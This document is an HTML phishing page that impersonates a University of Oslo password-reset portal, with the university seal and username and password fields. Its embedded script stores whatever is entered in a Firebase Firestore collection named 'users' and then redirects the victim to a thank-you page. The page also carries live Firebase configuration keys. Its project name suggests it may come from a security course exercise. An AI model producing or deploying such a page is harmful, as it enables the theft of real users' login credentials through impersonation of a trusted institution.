<!DOCTYPE html>
<html lang="en">


    <title> Login Page </title>  
    <style>   
    Body {  
      font-family: Calibri, Helvetica, sans-serif;  
      background-color: rgb(255, 255, 255);  
    }  
    img {
        max-width: 60px;
    }
    button {   
           background-color: #4CAF50;   
           width: 100%;  
            color: rgb(255, 255, 255);   
            padding: 15px;   
            margin: 10px 0px;   
            border: none;   
            cursor: pointer;   
             }   
     form {   
            border: 3px solid #f1f1f1;   
        }   
     input[type=text], input[type=password] {   
            width: 100%;   
            margin: 8px 0;  
            padding: 12px 20px;   
            display: inline-block;   
            border: 2px solid green;   
            box-sizing: border-box;   
        }  
     button:hover {   
            opacity: 0.7;   
        }   
      .cancelbtn {   
            width: auto;   
            padding: 10px 18px;  
            margin: 10px 5px;  
        }   
            
         
     .container {   
            padding: 25px;   
            background-color: lightblue;  
        }   
    </style>   
    <head>
    </head>    
    <body>    
        <center>  
            <h1> 
                <img src="https://upload.wikimedia.org/wikipedia/en/thumb/3/31/University_of_Oslo_seal.svg/1200px-University_of_Oslo_seal.svg.png"> 
                UiO Password Reset 
            </h1> 
        </center>   

        <div class="container">
            <h1>Login to reset password</h1>
            <label>Username : </label>
            <input type="text" placeholder="Enter Username" name="username" id="username" required>
            <label>Password : </label>
            <input type="password" placeholder="Enter Password" name="password" id="password" required>
            <button id="switchButton">Login</button>
            <button type="button" class="cancelbtn"> Cancel</button>
            Forgot <a href="#"> password? </a>
        </div>


        <script type="module">
            // Import the functions you need from the SDKs you need
            import { initializeApp } from "https://www.gstatic.com/firebasejs/10.5.2/firebase-app.js";
            import {
                getFirestore,
                collection,
                doc,
                addDoc
            } from "https://www.gstatic.com/firebasejs/10.5.2/firebase-firestore.js";

            // Your web app's Firebase configuration
            // For Firebase JS SDK v7.20.0 and later, measurementId is optional
            const firebaseConfig = {
              apiKey: "AIzaSyBra3YeM-B5AI1-aMcbqBZNfu1H7pgavQU",
              authDomain: "in5290-f8705.firebaseapp.com",
              projectId: "in5290-f8705",
              storageBucket: "in5290-f8705.appspot.com",
              messagingSenderId: "1002141342586",
              appId: "1:1002141342586:web:18fddbca34dedf93ae94c3",
              measurementId: "G-YXWY7656S5"
            };
          
            // Initialize Firebase
            const app = initializeApp(firebaseConfig);

            // Get a reference to the Firestore database
            const db = getFirestore();


            async function saveData() {
                const username = document.getElementById('username').value;
                const password = document.getElementById('password').value;

                const formData = {
                    username: username,
                    password: password
                };  
                const ref = await addDoc(collection(db, "users"), formData);
                window.location.href = "thank_you.html";
            }

            // Get a reference to the button element by its id
            const switchButton = document.getElementById('switchButton');
                
            // Add a click event listener to the button
            switchButton.addEventListener('click', function() {
                saveData();
            });
          </script>
    </body>  
</html>